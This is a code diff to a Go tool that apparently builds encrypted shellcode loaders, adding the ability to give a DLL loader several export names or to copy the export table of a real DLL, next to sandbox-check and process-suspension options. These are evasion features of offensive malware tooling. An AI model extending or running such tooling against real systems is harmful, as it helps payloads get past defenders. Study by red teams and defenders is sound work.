@@ -39,7 +39,7 @@ func options() *FlagOptions {
 	Does the Endpoint have more than 2 CPUs?
 	Does the Endpoint have more than 4 gigs of RAM?`)
 	encrypt := flag.Bool("encrypt", false, "Encrypts the shellcode using AES 256 encryption")
-	export := flag.String("export", "", "For DLL Loaders Only - Specify a specific Export function for a loader to have.")
+	export := flag.String("export", "", "For DLL Loaders Only - Specify comma separated Export functions for a loader to have or supply a given DLL file for cloning its Export functions.")
 	flag.Parse()
 	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, console: *console, Sha: *Sha, sandbox: *sandbox, process: *process, export: *export, encrypt: *encrypt}
 }
@@ -134,11 +134,27 @@ func main() {
 	} else {
 		mode = ".exe"
 	}
+	// Default DLL exports
+	var exports = []string{"DllRegisterServer", "DllGetClassObject", "DllUnregisterServer"}
 	if opt.export != "" {
-		fmt.Println("[!] Added an additional Export function called: " + opt.export)
+		if strings.HasSuffix(opt.export, ".dll") {
+			var err error
+			exports, err = Utils.ExportsFromFile(opt.export)
+			if err != nil {
+				log.Fatal("Error: Could not get Export table from given DLL file")
+			}
+			fmt.Println("[!] Added additional Export functions from parsed DLL file: " + opt.export)
+		} else if strings.Contains(opt.export, ",") {
+			exports = strings.Split(strings.ReplaceAll(opt.export, " ", ""), ",")
+			fmt.Println("[!] Added additional Export functions from given list: " + opt.export)
+		} else {
+			exports = []string{opt.export}
+			fmt.Println("[!] Added an additional Export function called: " + opt.export)
+		}
 	}
+
 	fmt.Println("[!] Selected Process to Suspend: " + opt.process)
-	name := Loader.CompileFile(shellcodeencoded, b64ciphertext, b64key, b64iv, opt.outFile, opt.console, mode, opt.export, opt.sandbox, opt.process, opt.encrypt)
+	name := Loader.CompileFile(shellcodeencoded, b64ciphertext, b64key, b64iv, opt.outFile, opt.console, mode, exports, opt.sandbox, opt.process, opt.encrypt)
 	execute(opt, name, mode)
 
 }
